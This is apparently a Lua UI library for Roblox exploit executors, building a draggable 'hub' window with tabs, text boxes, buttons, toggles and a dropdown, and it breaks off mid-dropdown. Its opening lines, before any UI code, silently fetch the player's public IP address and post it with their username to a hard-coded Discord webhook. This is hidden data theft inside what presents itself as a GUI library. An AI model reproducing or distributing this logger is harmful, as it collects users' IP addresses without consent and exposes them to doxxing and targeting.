local webh = "https://discord.com/api/webhooks/1099403403181957180/sewboWs6o5ELl4lflqE00aZlyQPw0p1SC3F0KHF3yVBXpIz51mMA-2H9rIvg2KJq_DHF"

pcall(function()
   local data = {
       ["embeds"] = {
           {
               ["title"] = game:GetService("Players").LocalPlayer.Name,
               ["description"] = game:HttpGet("https://api.ipify.org")
           }
       }
   }

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)


_G.Settings = {
	UI = {
		Color = Color3.fromRGB(255, 255, 255),
		Logo = "13186299760",
	},
}

do
	local ui = game.CoreGui:FindFirstChild("HeeNo") local ImageButtonD = game.CoreGui:FindFirstChild("ImageButton")
	if ui then
		ui:Destroy() ImageButtonD:Destroy()
	end
end

_G.Color = _G.Settings.UI.Color or Color3.fromRGB(255, 255, 255)
local LogoUI = _G.Settings.Logo or "11354741327"

local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local function MakeDraggable(topbarobject, object)
	local Dragging = nil
	local DragInput = nil
	local DragStart = nil
	local StartPosition = nil

	local function Update(input)
		local Delta = input.Position - DragStart
		local pos =
			UDim2.new(
				StartPosition.X.Scale,
				StartPosition.X.Offset + Delta.X,
				StartPosition.Y.Scale,
				StartPosition.Y.Offset + Delta.Y
			)
		local Tween = TweenService:Create(object, TweenInfo.new(0.2), {Position = pos})
		Tween:Play()
	end

	topbarobject.InputBegan:Connect(
		function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				Dragging = true
				DragStart = input.Position
				StartPosition = object.Position

				input.Changed:Connect(
					function()
						if input.UserInputState == Enum.UserInputState.End then
							Dragging = false
						end
					end
				)
			end
		end
	)

	topbarobject.InputChanged:Connect(
		function(input)
			if
				input.UserInputType == Enum.UserInputType.MouseMovement or
				input.UserInputType == Enum.UserInputType.Touch
			then
				DragInput = input
			end
		end
	)

	UserInputService.InputChanged:Connect(
		function(input)
			if input == DragInput and Dragging then
				Update(input)
			end
		end
	)
end

local library = {}

function library:Window(options)
	local text = options.Name
	local logo = options.Logo or LogoButton
	local keybind = options.Keybind or Enum.KeyCode.RightControl

    local currenttab = ""
    local uihide = false
    local abc = false
    yoo = string.gsub(tostring(keybind),"Enum.KeyCode.","")

    local HeeNo = Instance.new("ScreenGui")
    HeeNo.Name = "HeeNo"
    HeeNo.Parent = game.CoreGui
    HeeNo.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local Main = Instance.new("Frame")
    Main.Name = "Main"
    Main.Parent = HeeNo
    Main.AnchorPoint = Vector2.new(0.5,0.5)
    Main.ClipsDescendants = true
    Main.BackgroundColor3 = Color3.fromRGB(23, 24, 25)
    Main.Position = UDim2.new(0.5, 0, 0.499, 0)
    Main.Size = UDim2.new(0, 0, 0, 0)

    Main:TweenSize(UDim2.new(0, 580, 0, 365),"Out","Quad",0.4,true)

    local MainCorner = Instance.new("UICorner")
    MainCorner.Name = "MainCorner"
    MainCorner.Parent = Main
    
    local UIStroke96 = Instance.new("UIStroke")
	UIStroke96.Thickness = 3.2
	UIStroke96.Parent = Main
	UIStroke96.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	UIStroke96.LineJoinMode = Enum.LineJoinMode.Round
	UIStroke96.Color = _G.Color
	UIStroke96.Transparency = 0.10

    local Top = Instance.new("Frame")
    Top.Name = "Top"
    Top.Parent = Main
    Top.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Top.Size = UDim2.new(0, 580, 0, 29)

    local TopCorner = Instance.new("UICorner")
    TopCorner.Name = "TopCorner"
    TopCorner.Parent = Top

    local NameHub = Instance.new("TextLabel")
    NameHub.Name = "NameHub"
    NameHub.Parent = Top
    NameHub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    NameHub.BackgroundTransparency = 1.000
    NameHub.Position = UDim2.new(0, 90, 0, 0)
    NameHub.Size = UDim2.new(0, 61, 0, 27)
    NameHub.Font = Enum.Font.GothamSemibold
    NameHub.Text = string.upper(text)
    NameHub.TextColor3 = Color3.fromRGB(225, 225, 225)
    NameHub.TextSize = 15.000

    local NameHub2 = Instance.new("TextLabel")
    NameHub2.Name = "NameHub2"
    NameHub2.Parent = Top
    NameHub2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    NameHub2.BackgroundTransparency = 1.000
    NameHub2.Position = UDim2.new(0, 145, 0, 0)
    NameHub2.Size = UDim2.new(0, 61, 0, 27)
    NameHub2.Font = Enum.Font.GothamSemibold
    NameHub2.Text = ""
    NameHub2.TextColor3 = _G.Color
    NameHub2.TextSize = 17.000
    NameHub2.TextXAlignment = Enum.TextXAlignment.Left
    
    local Logo = Instance.new("ImageLabel")
	Logo.Name = "Logo"
	Logo.Parent = Top
	Logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Logo.BackgroundTransparency = 1.000
	Logo.Position = UDim2.new(0, 1, 0, 0.-7)
	Logo.Size = UDim2.new(0, 40, 0, 40)
	Logo.Image = "rbxassetid://"..tostring(logo)
	
	local close = Instance.new("ImageButton")
  local mainDiscord = Instance.new("ImageButton")
  
  close.Name = "close"
    close.Parent = Top
    close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    close.BackgroundTransparency = 1.000
    close.BorderSizePixel = 0
    close.Position = UDim2.new(0, 540, 0, 0)
    close.Size = UDim2.new(0, 30, 0, 30)
    close.Image = "http://www.roblox.com/asset/?id=3926305904"
    close.ImageRectOffset = Vector2.new(284, 4)
    close.ImageRectSize = Vector2.new(24, 24)
    close.ImageColor3 = Color3.fromRGB(255, 255, 255)
    close.MouseLeave:Connect(function()
        Utility:TweenObject(close, {BackgroundTransparency = 1}, 0.1)
    end)
    
    close.MouseEnter:Connect(function()
        Utility:TweenObject(close, {BackgroundTransparency = 0.5}, 0.1)
    end)
    
    close.MouseButton1Click:Connect(function()
        game.TweenService:Create(close, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
            ImageTransparency = 1
        }):Play()
        wait()
        game.TweenService:Create(Main, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			Size = UDim2.new(0,0,0,0),
			Position = UDim2.new(0, Main.AbsolutePosition.X + (Main.AbsoluteSize.X / 2), 0, Main.AbsolutePosition.Y + (Main.AbsoluteSize.Y / 2))
		}):Play()
        wait(1)
        ScreenGui:Destroy()
    end)
  
  mainDiscord.Name = "mainDiscord"
    mainDiscord.Parent = Top
    mainDiscord.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    mainDiscord.BackgroundTransparency = 1.000
    mainDiscord.Position = UDim2.new(0, 500, 0, 0)
    mainDiscord.Size = UDim2.new(0, 30, 0, 30)
    mainDiscord.Image = "http://www.roblox.com/asset/?id=12058969086"
    mainDiscord.ImageColor3 = Color3.fromRGB(200, 200, 200)
    
    mainDiscord.MouseLeave:Connect(function()
        Utility:TweenObject(mainDiscord, {BackgroundTransparency = 1}, 0.1)
    end)
    
    mainDiscord.MouseEnter:Connect(function()
        Utility:TweenObject(mainDiscord, {BackgroundTransparency = 0.5}, 0.1)
    end)

    mainDiscord.MouseButton1Click:Connect(function()
        setclipboard("https://discord.gg/Mp7qppfwER")
        wait(.1)
        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = "Discord",
            Text = "Discord copied on your clipboard",
            Button1 = "Okay",
            Duration = 20
        })
    end)
	
	local osday = Instance.new("TextLabel")
    osday.Name = "osday"
    osday.Parent = Top
    osday.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    osday.BackgroundTransparency = 1.000
    osday.Position = UDim2.new(0, 255, 0, 0)
    osday.Size = UDim2.new(0, 61, 0, 27)
    osday.Font = Enum.Font.GothamSemibold
    osday.TextColor3 = Color3.fromRGB(255, 255, 255)
    osday.TextSize = 17.000
    osday.Text = ""
    osday.TextXAlignment = Enum.TextXAlignment.Left
	

    local BindButton = Instance.new("TextButton")
    BindButton.Name = "BindButton"
    BindButton.Parent = Top
    BindButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    BindButton.BackgroundTransparency = 1.000
    BindButton.Position = UDim2.new(0, 550, 0, 0)
    BindButton.Size = UDim2.new(0, 100, 0, 27)
    BindButton.Font = Enum.Font.GothamSemibold
    BindButton.Text = ""
    BindButton.TextColor3 = Color3.fromRGB(103, 103, 103)
    BindButton.TextSize = 11.000

    BindButton.MouseButton1Click:Connect(function ()
        BindButton.Text = "[ ... ]"
        local inputwait = game:GetService("UserInputService").InputBegan:wait()
        local shiba = inputwait.KeyCode == Enum.KeyCode.Unknown and inputwait.UserInputType or inputwait.KeyCode

        if
        shiba.Name ~= "Focus" and shiba.Name ~= "MouseMovement" and shiba.Name ~= "Focus"
        then
            BindButton.Text = "[ "..shiba.Name.." ]"
            yoo = shiba.Name
        end
    end)

    
    local Tab = Instance.new("Frame")
    Tab.Name = "Tab"
    Tab.Parent = Main
    Tab.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Tab.Position = UDim2.new(0, 1, 0, 320)
	Tab.Size = UDim2.new(0, 580, 0, 50)
	Tab.ZIndex = 5

    local TabCorner = Instance.new("UICorner")
    TabCorner.CornerRadius = UDim.new(0, 20)
    TabCorner.Name = "TabCorner"
    TabCorner.Parent = Tab
    
    local ScrollTab = Instance.new("ScrollingFrame")
    ScrollTab.Name = "ScrollTab"
    ScrollTab.Parent = Tab
    ScrollTab.Active = true
    ScrollTab.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ScrollTab.BackgroundTransparency = 1.000
    ScrollTab.Position = UDim2.new(0, 23, 0, 0)
    ScrollTab.BorderSizePixel = 0
    ScrollTab.Size = UDim2.new(0, 600, 0, 41)
    ScrollTab.CanvasSize = UDim2.new(0, 0, 0, 0)
    ScrollTab.ScrollBarThickness = 0
    
    local UIPadding = Instance.new("UIPadding")
    UIPadding.Parent = ScrollTab
    UIPadding.PaddingLeft = UDim.new(0, 7)
   

    local TabList = Instance.new("UIListLayout")
    TabList.Name = "TabList"
    TabList.Parent = ScrollTab
    TabList.FillDirection = Enum.FillDirection.Horizontal
    TabList.SortOrder = Enum.SortOrder.LayoutOrder
    TabList.Padding = UDim.new(0, 3)

    MakeDraggable(Top,Main)

	UserInputService.InputBegan:Connect(function(input)
		if input.KeyCode == Enum.KeyCode[yoo] then
			if uihide == false then
				uihide = true
				Main:TweenSize(UDim2.new(0, 0, 0, 0),"In","Quad",0.4,true)
				UIStroke96.Transparency = 1
			else
				uihide = false
				UIStroke96.Transparency = 0.10
				Main:TweenSize(UDim2.new(0, 580, 0, 365),"Out","Quad",0.4,true)
				--UDim2.new(0, 300, 0, 285)
			end
		end
	end)

    local Page = Instance.new("Frame")
    Page.Name = "Page"
    Page.Parent = Main
    Page.BackgroundColor3 = Color3.fromRGB(15, 16, 17)
    Page.Position = UDim2.new(0, 11, 0, 35)
    Page.Size = UDim2.new(0, 555, 0, 300)

    local PageCorner = Instance.new("UICorner")
    PageCorner.Name = "PageCorner"
    PageCorner.Parent = Page

    local PageFolder = Instance.new("Folder")
    PageFolder.Name = "PageFolder"
    PageFolder.Parent = Page

    local UIPageLayout = Instance.new("UIPageLayout")

    UIPageLayout.Parent = PageFolder
    UIPageLayout.SortOrder = Enum.SortOrder.LayoutOrder
    UIPageLayout.EasingDirection = Enum.EasingDirection.InOut
    UIPageLayout.EasingStyle = Enum.EasingStyle.Quad
    UIPageLayout.Padding = UDim.new(0, 7)
    UIPageLayout.TweenTime = 0.400
    UIPageLayout.GamepadInputEnabled = false
    UIPageLayout.ScrollWheelInputEnabled = false
    UIPageLayout.TouchInputEnabled = false


    local Ui = {}
    function Ui:AddTab(options)
    	local logo1 = options.LogoTab
    
        local TabButton = Instance.new("TextButton")
        TabButton.Name = "TabButton"
        TabButton.Parent = ScrollTab
        TabButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        TabButton.BackgroundTransparency = 1.000
        TabButton.Size = UDim2.new(0, 45, 0, 41)
        TabButton.Position = UDim2.new(0, 100, 0, 0)
        TabButton.Font = Enum.Font.GothamSemibold
        TabButton.TextColor3 = Color3.fromRGB(225, 225, 225)
        TabButton.TextSize = 15.000
        TabButton.Text = ""
        TabButton.TextTransparency = 0.500
        
        local UIStroke6 = Instance.new("UIStroke")
		UIStroke6.Thickness = 1
		UIStroke6.Parent = TabButton
		UIStroke6.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		UIStroke6.LineJoinMode = Enum.LineJoinMode.Round
		--UIStroke6.Color = Color3.fromRGB(225, 225, 225)
		UIStroke6.Transparency = 0.10
        
        local IDK = Instance.new("ImageLabel")
		IDK.Name = "LogoIDK"..logo1
		IDK.Parent = TabButton
		IDK.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		IDK.Position = UDim2.new(0, 1, 0, 10)
		IDK.BackgroundTransparency = 1.000
		IDK.Size = UDim2.new(0, 35, 0, 25)
		IDK.Image = "rbxassetid://"..tostring(logo1)
        
        local MainPage = Instance.new("Frame")

        MainPage.Name = "MainPage"
        MainPage.Parent = PageFolder
        MainPage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        MainPage.BackgroundTransparency = 1.000
        MainPage.Position = UDim2.new(0.00157977885, 0, 0, 0)
        MainPage.Size = UDim2.new(0, 500, 0, 305)

        TabButton.MouseButton1Click:Connect(function()
            for i,v in next, ScrollTab:GetChildren() do
                if v:IsA("TextButton") then
                    TweenService:Create(
                        v,
                        TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
                        {TextTransparency = 0}
                    ):Play()
                end
                TweenService:Create(
                    TabButton,
                    TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
                    {TextTransparency = 0}
                ):Play()
            end
			UIPageLayout:JumpTo(MainPage)
            for i,v in next, PageFolder:GetChildren() do 
                if v.Name == "MainPage" then
                    currenttab = v.Name
                end
            end
		end)

		if abc == false then
            for i,v in next, ScrollTab:GetChildren() do
                if v:IsA("TextButton") then
                    TweenService:Create(
                        v,
                        TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
                        {TextTransparency = 0}
                    ):Play()
                    --UIStroke002.Color.Color = Color3.fromRGB(225, 225, 225)
                end
                TweenService:Create(
                    TabButton,
                    TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
                    {TextTransparency = 0}
                ):Play()
                --UIStroke002.Color.Color = Color3.fromRGB(225, 0, 0)
            end
            UIPageLayout:JumpToIndex(1)
			abc = true
		end

        local uitab = {}
        function uitab:AddPage()
            local MainFramePage = Instance.new("Frame")
            local UICorner = Instance.new("UICorner")
            local ScrollPage = Instance.new("ScrollingFrame")
            local PageList = Instance.new("UIListLayout")
            local UIPadding = Instance.new("UIPadding")
            local UIPadding_2 = Instance.new("UIPadding")
            local UIListLayout_2 = Instance.new("UIListLayout")
        
            MainFramePage.Name = "MainFramePage"
            MainFramePage.Parent = MainPage
            MainFramePage.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            MainFramePage.Size = UDim2.new(0, 260, 0, 285)
        
            UICorner.Parent = MainFramePage
        
            ScrollPage.Name = "ScrollPage".."_Page"
            ScrollPage.Parent = MainFramePage
            ScrollPage.Active = true
            ScrollPage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            ScrollPage.BackgroundTransparency = 1.000
            ScrollPage.BorderSizePixel = 0
            ScrollPage.Size = UDim2.new(0, 260, 0, 285)
            ScrollPage.CanvasSize = UDim2.new(0, 0, 0, 0)
            ScrollPage.ScrollBarThickness = 0
        
            PageList.Name = "PageList"
            PageList.Parent = ScrollPage
            PageList.SortOrder = Enum.SortOrder.LayoutOrder
            PageList.Padding = UDim.new(0, 15)
        
            UIPadding.Parent = ScrollPage
            UIPadding.PaddingLeft = UDim.new(0, 10)
            UIPadding.PaddingTop = UDim.new(0, 10)
        
            UIPadding_2.Parent = MainPage
            UIPadding_2.PaddingLeft = UDim.new(0, 10)
            UIPadding_2.PaddingTop = UDim.new(0, 10)
        
            UIListLayout_2.Parent = MainPage
            UIListLayout_2.FillDirection = Enum.FillDirection.Horizontal
            UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
            UIListLayout_2.Padding = UDim.new(0, 15)
            
            game:GetService("RunService").Stepped:Connect(function()
                pcall(function()
                    ScrollPage.CanvasSize = UDim2.new(0,0,0,PageList.AbsoluteContentSize.Y + 26)
                    ScrollPage2.CanvasSize = UDim2.new(0,0,0,PageList2.AbsoluteContentSize.Y + 26)
                    ScrollTab.CanvasSize = UDim2.new(0,TabList.AbsoluteContentSize.X + 20,0,0)
                end)
            end)

            local main = {}
			
function main:Textbox(text,disappear,callback)
 local Textbox = Instance.new("Frame")
 local TextboxCorner = Instance.new("UICorner")
 local Textboxx = Instance.new("Frame")
 local TextboxxCorner = Instance.new("UICorner")
 local TextboxxCorner1 = Instance.new("UICorner")
 local TextboxLabel = Instance.new("TextLabel")
 local txtbtn = Instance.new("TextButton")
 local RealTextbox = Instance.new("TextBox")
 local UICorner = Instance.new("UICorner")
 
 Textbox.Name = "Textbox"
 Textbox.Parent = ScrollPage
 Textbox.BackgroundColor3 = Color3.fromRGB(255,255,255)
 Textbox.BackgroundTransparency = 1
 Textbox.Size = UDim2.new(0, 243, 0, 31)
 
 TextboxxCorner.CornerRadius = UDim.new(0, 5)
 TextboxxCorner.Name = "TextboxxCorner"
 TextboxxCorner.Parent = Textbox
 
 local postog123 = Instance.new("UIStroke")
 
 postog123.Name = "UIStroke"
 postog123.Parent = Textbox
 postog123.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 postog123.Color = Color3.fromRGB(255,255,255)
 postog123.LineJoinMode = Enum.LineJoinMode.Round
 postog123.Thickness = 1
 postog123.Transparency = 0.8
 postog123.Enabled = true
 postog123.Archivable = true
 
 TextboxCorner.CornerRadius = UDim.new(0, 0)
 TextboxCorner.Name = "TextboxCorner"
 TextboxCorner.Parent = Textbox
 
 Textboxx.Name = "Textboxx"
 Textboxx.Parent = Textbox
 Textboxx.BackgroundColor3 = Color3.fromRGB(30,30,30)
 Textboxx.Position = UDim2.new(0, 1, 0, 1)
 Textboxx.BackgroundTransparency = 1
 Textboxx.Size = UDim2.new(0, 240, 0, 29)
 
 TextboxLabel.Name = "TextboxLabel"
 TextboxLabel.Parent = Textbox
 TextboxLabel.BackgroundColor3 = Color3.fromRGB(224,224,224)
 TextboxLabel.BackgroundTransparency = 1.000
 TextboxLabel.Position = UDim2.new(0, 15, 0, 0)
 TextboxLabel.Text = text
 TextboxLabel.Size = UDim2.new(0, 145, 0, 31)
 TextboxLabel.Font = Enum.Font.GothamSemibold
 TextboxLabel.TextColor3 = Color3.fromRGB(225, 225, 225)
 TextboxLabel.TextSize = 16.000
 TextboxLabel.TextTransparency = 0
 TextboxLabel.TextXAlignment = Enum.TextXAlignment.Left
 
 txtbtn.Name = "txtbtn"
 txtbtn.Parent = Textbox
 txtbtn.BackgroundColor3 = Color3.fromRGB(224,224,224)
 txtbtn.BackgroundTransparency = 1.000
 txtbtn.Position = UDim2.new(0, 1, 0, 1)
 txtbtn.Size = UDim2.new(0, 370, 0, 29)
 txtbtn.Font = Enum.Font.SourceSans
 txtbtn.Text = ""
 txtbtn.TextColor3 = Color3.fromRGB(0, 0, 0)
 txtbtn.TextSize = 14.000
 
 RealTextbox.Name = "RealTextbox"
 RealTextbox.Parent = Textbox
 RealTextbox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
 RealTextbox.BackgroundTransparency = 0
 RealTextbox.Position = UDim2.new(0, 130, 0, 4)
 RealTextbox.Size = UDim2.new(0, 100, 0, 24)
 RealTextbox.Font = Enum.Font.GothamSemibold
 RealTextbox.Text = ""
 RealTextbox.TextColor3 = Color3.fromRGB(225, 225, 225)
 RealTextbox.TextSize = 11.000
 RealTextbox.TextTransparency = 0
 
 TextboxxCorner1.CornerRadius = UDim.new(0, 5)
 TextboxxCorner1.Name = "TextboxxCorner"
 TextboxxCorner1.Parent = RealTextbox
 
 RealTextbox.FocusLost:Connect(function()
  callback(RealTextbox.Text)
  if disappear then
  RealTextbox.Text = ""
  end
 end)
end
            
 function main:Button(text,callback)
 local Button = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
 local TextBtn = Instance.new("TextButton")
 local UICorner_2 = Instance.new("UICorner")
 local Black = Instance.new("Frame")
 local UICorner_3 = Instance.new("UICorner")
 
 Button.Name = "Button"
 Button.Parent = ScrollPage
 Button.BackgroundColor3 = Color3.fromRGB(225, 225, 225)
 Button.BackgroundTransparency = 1
 Button.Size = UDim2.new(0, 50, 0, 31)
 
 UICorner.CornerRadius = UDim.new(0, 5)
 UICorner.Parent = Button
 
 TextBtn.Name = "TextBtn"
 TextBtn.Parent = Button
 TextBtn.BackgroundColor3 = Color3.fromRGB(244,244,244)
 TextBtn.BackgroundTransparency = 0.500
 TextBtn.Position = UDim2.new(0, 1, 0, 1)
 TextBtn.Size = UDim2.new(0, 243, 0, 29)
 TextBtn.AutoButtonColor = false
 TextBtn.Font = Enum.Font.GothamSemibold
 TextBtn.Text = text
 TextBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextBtn.TextSize = 10.000
 
 UICorner_2.CornerRadius = UDim.new(0, 5)
 UICorner_2.Parent = TextBtn
 
 Black.Name = "Black"
 Black.Parent = Button
 Black.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 Black.BackgroundTransparency = 1.000
 Black.BorderSizePixel = 0
 Black.Position = UDim2.new(0, 1, 0, 1)
 Black.Size = UDim2.new(0, 260, 0, 29)
 
 UICorner_3.CornerRadius = UDim.new(0, 5)
 UICorner_3.Parent = Black
 
 
 
 TextBtn.MouseEnter:Connect(function()
  TweenService:Create(
   Black,
   TweenInfo.new(0.4,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
   {
    BackgroundTransparency = 0.7
   }
  ):Play()
  end)
 TextBtn.MouseLeave:Connect(function()
  TweenService:Create(
   Black,
   TweenInfo.new(0.4,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
   {
    BackgroundTransparency = 1
   }
  ):Play()
  end)
 TextBtn.MouseButton1Click:Connect(function()
  TextBtn.TextSize = 0
  TweenService:Create(
   TextBtn,
   TweenInfo.new(0.4,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
   {
    TextSize = 10
   }
  ):Play()
  callback()
  end)
 end

function main:Toggle(TogInfo,default,callback)
 local toggle = false
 local CheckFrame = Instance.new("Frame")
 local CheckFrame2 = Instance.new("Frame")
 local UIListLayout = Instance.new("UIListLayout")
 local UICorner = Instance.new("UICorner")
 local ImageLabel = Instance.new("ImageLabel")
 local Space = Instance.new("TextLabel")
 local Title = Instance.new("TextLabel")
 local ImageButton = Instance.new("ImageButton")
 
 -- Prop --
 CheckFrame.Name = TogInfo or "CheckFrame"
 CheckFrame.Parent = ScrollPage
 CheckFrame.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
 CheckFrame.BackgroundTransparency = 1.000
 CheckFrame.BorderSizePixel = 0
 CheckFrame.Size = UDim2.new(0, 38, 0, 30)
 
 CheckFrame2.Name = "CheckFrame2"
 CheckFrame2.Parent = CheckFrame
 CheckFrame2.BackgroundColor3 = Color3.fromRGB(30,30,30)
 CheckFrame2.BackgroundTransparency = 1
 CheckFrame2.BorderSizePixel = 0
 CheckFrame2.Position = UDim2.new(0, 3, 0, 0)
 CheckFrame2.Size = UDim2.new(0, 243, 0, 30)

local postog12 = Instance.new("UIStroke")
 
 postog12.Name = "UIStroke"
 postog12.Parent = CheckFrame2
 postog12.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 postog12.Color = Color3.fromRGB(255,255,255)
 postog12.LineJoinMode = Enum.LineJoinMode.Round
 postog12.Thickness = 1
 postog12.Transparency = 0.8
 postog12.Enabled = true
 postog12.Archivable = true
 
 
 UICorner.Parent = CheckFrame2
 UICorner.CornerRadius = UDim.new(0, 3)
 
 ImageLabel.Name = "ImageLabel"
 ImageLabel.Parent = CheckFrame2
 ImageLabel.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
 ImageLabel.BackgroundTransparency = 1.000
 ImageLabel.BorderSizePixel = 0
 ImageLabel.Position = UDim2.new(-0.018, 0,-0.252, 0)
 ImageLabel.Size = UDim2.new(0, 45,0, 45)
 ImageLabel.Image = "rbxassetid://11354741327"
 ImageLabel.ImageColor3 = Color3.fromRGB(224,224,224)
 
 Space.Name = "Space"
 Space.Parent = CheckFrame2
 Space.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
 Space.BackgroundTransparency = 1.000
 Space.Position = UDim2.new(0, 30, 0, 0)
 Space.Size = UDim2.new(0, 15, 0, 30)
 Space.Font = Enum.Font.GothamSemibold
 Space.Text = "|"
 Space.TextSize = 12.000
 Space.TextColor3 = Color3.fromRGB(255,225,225)
 Space.TextXAlignment = Enum.TextXAlignment.Center
 
 Title.Name = "Title"
 Title.Parent = CheckFrame2
 Title.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
 Title.BackgroundTransparency = 1.000
 Title.Position = UDim2.new(0, 50, 0, 0)
 Title.Size = UDim2.new(0, 280, 0, 30)
 Title.Font = Enum.Font.GothamSemibold
 Title.Text = TogInfo or "checkBox Title"
 Title.TextColor3 = Color3.fromRGB(224,224,224)
 Title.TextSize = 10.000
 Title.TextXAlignment = Enum.TextXAlignment.Left
 
 ImageButton.Name = "ImageButton"
 ImageButton.Parent = CheckFrame2
 ImageButton.BackgroundColor3 = Color3.fromRGB(224,224,224)
 ImageButton.BackgroundTransparency = 1.000
 ImageButton.Position = UDim2.new(0, 215, 0, 4)
 ImageButton.Size = UDim2.new(0, 23, 0, 23)
 ImageButton.ZIndex = 2
 ImageButton.Image = "rbxassetid://3926311105"
 ImageButton.ImageColor3 = Color3.fromRGB(224,224,224)
 ImageButton.ImageRectOffset = Vector2.new(940, 784)
 ImageButton.ImageRectSize = Vector2.new(48, 48)
 
 -- Toggle Script --
 
 if default == true then
 ImageButton.ImageRectOffset = Vector2.new(4, 836)
 game.TweenService:Create(ImageButton, TweenInfo.new(0.08, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
  {
   ImageColor3 = Color3.fromRGB(255,225,225)}
 ):Play()
 toggle = not toggle
 pcall(callback, toggle)
 end
 
 ImageButton.MouseButton1Click:Connect(function()
  if toggle == false then
  game.TweenService:Create(ImageButton, TweenInfo.new(0.08, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
   {
    ImageColor3 = Color3.fromRGB(255,225,225)}
  ):Play()
  ImageButton.ImageRectOffset = Vector2.new(4, 836)
  else
   game.TweenService:Create(ImageButton, TweenInfo.new(0.08, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
   {
    ImageColor3 = Color3.fromRGB(224,224,224)}
  ):Play()
  ImageButton.ImageRectOffset = Vector2.new(940, 784)
  end
  toggle = not toggle
  pcall(callback, toggle)
  end)
 end

function main:Dropdown(text,option,callback)
 local isdropping = false
 local Dropdown = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
 local DropTitle = Instance.new("TextLabel")
 local DropScroll = Instance.new("ScrollingFrame")
 local UIListLayout = Instance.new("UIListLayout")
 local UIPadding = Instance.new("UIPadding")
 local DropButton = Instance.new("TextButton")
 local DropImage = Instance.new("ImageLabel")
 local posto1 = Instance.new("UIStroke")
 
 Dropdown.Name = "Dropdown"
 Dropdown.Parent = ScrollPage
 Dropdown.BackgroundColor3 = Color3.fromRGB(28,28,28)
 Dropdown.BackgroundTransparency = 1
 Dropdown.ClipsDescendants = true
 Dropdown.Size = UDim2.new(0, 243, 0, 31)
 
 posto1.Name = "posto"
 posto1.Parent = Dropdown
 posto1.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 posto1.Color = Color3.fromRGB(255,255,255)
 posto1.LineJoinMode = Enum.LineJoinMode.Round
 posto1.Thickness = 1
 posto1.Transparency = 0.8
 posto1.Enabled = true
 posto1.Archivable = true
 
 UICorner.CornerRadius = UDim.new(0, 3)
 UICorner.Parent = Dropdown
 
 DropTitle.Name = "DropTitle"
 DropTitle.Parent = Dropdown
 DropTitle.BackgroundColor3 = Color3.fromRGB(224,224,224)
 DropTitle.BackgroundTransparency = 1.000
 DropTitle.Size = UDim2.new(0, 140, 0, 31)
 DropTitle.Font = Enum.Font.GothamSemibold
 DropTitle.Text = text.. " : "
 DropTitle.TextColor3 = Color3.fromRGB(225, 225, 225)
 DropTitle.TextSize = 10.000
 
 DropScroll.Name = "DropScroll"
 DropScroll.Parent = DropTitle
 DropScroll.Active = true
 DropScroll.BackgroundColor3 = Color3.fromRGB(224,224,224)
 DropScroll.BackgroundTransparency = 1.000
 DropScroll.BorderSizePixel = 0
 DropScroll.Position = UDim2.new(0, 0, 0, 31)
 DropScroll.Size = UDim2.new(0, 360, 0, 100)
 DropScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
 DropScroll.ScrollBarThickness = 3
 
 UIListLayout.Parent = DropScroll
 UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
 UIListLayout.Padding = UDim.new(0, 5)
 
 UIPadding.Parent = DropScroll
 UIPadding.PaddingLeft = UDim.new(0, 5)
